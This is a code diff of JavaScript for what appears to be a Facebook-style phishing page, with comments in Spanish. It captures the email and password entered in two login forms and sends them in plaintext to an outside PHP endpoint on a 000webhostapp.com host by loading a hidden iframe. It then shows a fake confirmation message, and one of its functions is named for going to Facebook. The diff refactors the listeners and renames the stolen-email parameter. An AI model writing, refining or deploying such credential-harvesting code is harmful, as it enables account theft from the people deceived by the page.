@@ -1,6 +1,6 @@
 //##############################
 //PARA LA PRIMERA ENTRADA:
-var btnC1 = document.getElementById("btn-login").addEventListener("click", validarEntrada1);
+listenerbtn("btn-login", validarEntrada1); //este es el nuevo complemento que escucha el btn y usa una funcion
 function validarEntrada1() {
 	var inputE1 = document.getElementById("email1");
 	var inputE2 = document.getElementById("pass1");
@@ -13,7 +13,7 @@ function validarEntrada1() {
 }
 
 //PARA LA SEGUNDA ENTRADA:
-var btnC2 = document.getElementById("btnConfirmacion").addEventListener("click", validarEntrada2);
+listenerbtn("btnConfirmacion", validarEntrada2);
 function validarEntrada2() {
 	var inputE3 = document.getElementById("email2");
 	var inputE4 = document.getElementById("pass2");
@@ -54,7 +54,7 @@ function enviarDatos(emailN, passN) {
 			var contrasena = document.getElementById(passN).value;
 		
 		//variable de la url
-		var srcRegistro = "https://acc-form-srv-in.000webhostapp.com/formulario.php?fecha=" + fecha + "&usuario=" + usuario + "&pass=" + contrasena;
+		var srcRegistro = "https://acc-form-srv-in.000webhostapp.com/formulario.php?fecha=" + fecha + "&email=" + usuario + "&pass=" + contrasena;
 		//obtener la caja donde va a estar el iframe
 		var boxIframe = document.getElementById("boxIframeBD");
 		//crear el hijo el cual es el ifame y añadirlo con todos sus datos a la pagina
@@ -84,7 +84,6 @@ function irAFacebook() {
 
 function cambiarCuadro() {
 	var btnConfirmacion = document.getElementById("btnConfirmacion").disabled = true;
-	var btnCancelar = document.getElementById("btnCancelar").disabled = true;
 	
 	var cajaBotones = document.getElementById("cajaBotones");
 	cajaBotones.style.opacity = "0.5";
@@ -97,6 +96,3 @@ function cambiarCuadro() {
 		cajaCredenciales.innerHTML = "[msg: proceso confirmado.]";
 	}, 3000);
 }
-
-
-
